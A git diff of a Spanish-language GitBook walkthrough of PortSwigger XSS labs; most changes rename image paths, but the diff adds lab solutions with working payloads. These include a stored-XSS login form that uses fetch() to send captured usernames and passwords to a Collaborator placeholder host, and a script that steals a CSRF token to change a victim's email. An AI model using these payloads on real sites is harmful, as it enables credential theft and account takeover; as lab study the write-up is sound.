@@ -32,7 +32,7 @@ Vamos a escribir un comentario con el payload del anterior laboratorio.
 
 <figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Lab: DOM XSS in `document.write` sink using source `location.search`
 
@@ -48,7 +48,7 @@ Utiliza la función **document.write** de JavaScript, que escribe datos en la p�
 
 Observamos que al buscar se refleja en la página pero no de la misma manera por lo que inspeccionamos a ver qué pasa.
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Lo que hemos buscado se encuentra en el atributo **src** de una imagen por lo que realizamos el siguiente payload.
 
@@ -56,7 +56,7 @@ Lo que hemos buscado se encuentra en el atributo **src** de una imagen por lo qu
 "><img src=x onerror=alert('BEAFN28')>
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -130,7 +130,7 @@ Esta vez no tenemos ninguna barra de búsqueda ni nada por lo que revisamos el c
 
 Este código, en esencia, toma el valor que se encuentra después del símbolo **#** en la URL y lo utiliza para buscar ese término dentro de la página. Una vez que lo localiza, realiza un desplazamiento automático (scroll) hasta la sección donde se encuentra.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Sabiendo esto realizamos este payload.
 
@@ -138,7 +138,7 @@ Sabiendo esto realizamos este payload.
 <iframe src="https://0aac008603b76d4880f22bb200c80064.web-security-academy.net/#" onload="this.src+='<img src=/ onerror=print()>'"></iframe>
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Al pulsar el botón de **Deliver exploit to victim** completamos el laboratorio.
 
@@ -156,7 +156,7 @@ Para resolver el laboratorio, realiza un ataque de XSS que inyecte un atributo y
 
 Comprobamos que se refleja en el navegador. Vemos el código fuente.
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 No podemos hacer los payloads normales porque los signos > y < nos lo urlcodea por lo que realizamos que tras unas simples comillas en el código fuente se deja un espacio y en ese espacio aprovechamos para añadir un payload.
 
@@ -351,17 +351,17 @@ Sabiendo esto, podemos diseñar un payload XSS típico, pero poniendo los signos
 
 No nos deja aplicar las etiquetas que hemos usado comunes. Por lo que interceptamos la petición de búsqueda y la mandamos al Intruder. Vamos realizar un ataque de tipo Sniper por lo que copiamos los tags del cheatsheet en el payload.
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 Acepta la etiqueta **body**.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ahora vemos eventos existentes (copiados del cheatsheet) de esa etiqueta por lo que lo comprobamos en el **Intruder**.
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Esos eventos son los que nos da código 200, tenemos que averiguar cuál de ellos nos viene bien para hacer la inyección. Usamos **onresize**.
 
@@ -404,9 +404,9 @@ Este laboratorio tiene una vulnerabilidad sencilla de XSS reflejado. El sitio bl
 
 No nos sirve las etiquetas comunes ni nos deja crearlas customizadas. Interceptamos la petición para enviarlo al Intruder.
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Encontramos estos tags vamos a ver información del primero.
 
@@ -464,7 +464,7 @@ Para resolver el laboratorio, realiza un ataque de cross-site scripting que romp
 
 Buscamos algo y vemos el código fuente.
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 La variable **searchTerms** almacena el valor ingresado en la búsqueda. Luego, **document.write** inserta ese valor en el DOM dentro de una etiqueta `<img>`. Aunque se aplica **encodeURIComponent** para escapar caracteres en la URL, la inyección ocurre antes de esa codificación al romper el contexto del script con `</script>`, permitiendo ejecutar HTML arbitrario.
 
@@ -598,4 +598,61 @@ Un usuario víctima simulado **visualiza todos los comentarios después de que s
 
 ### Resolución
 
-S3WWXWA<
+Cogemos las etiquetas de login para obtener el valor dentro de esos inputs con el payload siguiente. Lo siguiente lo ponemos en el apartado de Comment con el enlace del Collaborator.
+
+```
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-04 095254.png" alt=""><figcaption></figcaption></figure>
+
+Al subirlo le damos pull now en el apartado de Collaborator.
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-04 095238.png" alt=""><figcaption></figcaption></figure>
+
+Obtenemos las credenciales así que nos logueamos.
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-04 095320.png" alt=""><figcaption></figcaption></figure>
+
+## Lab: Exploiting XSS to bypass CSRF defenses
+
+### Enunciado
+
+**Este laboratorio contiene una vulnerabilidad de XSS almacenado (stored XSS) en la función de comentarios del blog. Para resolver el laboratorio**, explota la vulnerabilidad para **robar un token CSRF**, que luego podrás usar para **cambiar la dirección de correo electrónico de alguien que vea los comentarios de la publicación del blog**.
+
+**Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:**
+
+* **Usuario:** `wiener`
+* **Contraseña:** `peter`
+
+### Resolución
+
+Nos logueamos y cambiamos el correo para ver la petición.
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Tiene un valor CSRF. Podemos simular esa petición con esos campos en Comment.
+
+```
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('email=hola@gmail.com'+'&csrf='+token)
+};
+</script>
+```
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
